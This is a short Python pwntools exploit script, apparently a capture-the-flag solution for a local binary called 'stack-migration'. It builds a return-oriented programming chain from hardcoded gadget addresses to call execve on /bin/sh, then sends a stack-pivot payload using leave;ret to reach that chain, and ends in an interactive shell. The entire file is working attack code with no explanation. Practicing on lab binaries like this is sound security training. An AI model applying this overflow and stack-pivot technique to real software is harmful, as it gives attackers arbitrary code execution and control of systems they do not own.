#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./stack-migration')
elf = ELF('./stack-migration')

buf1_addr = 0x6BC2C0
leave_ret = 0x400bfa
prax_rdx_ret = 0x481b96 #pop rax ; pop rdx ; pop rbx ; ret
prdi_ret = 0x4006a6
prsi_ret = 0x40fff3
syscall = 0x474c85
binsh = 0x492424

payload  = p64(prax_rdx_ret) + p64(0x3b) + p64(0)*2
payload += p64(prsi_ret) + p64(0)
payload += p64(prdi_ret) + p64(binsh)
payload += p64(syscall)
p.recvuntil("Please pwn me :)\n")
p.sendline(payload)

payload = 'A'*8 + p64(buf1_addr-8) + p64(leave_ret)
p.recvuntil("Enter your name: \n")
p.sendline(payload)
p.interactive()
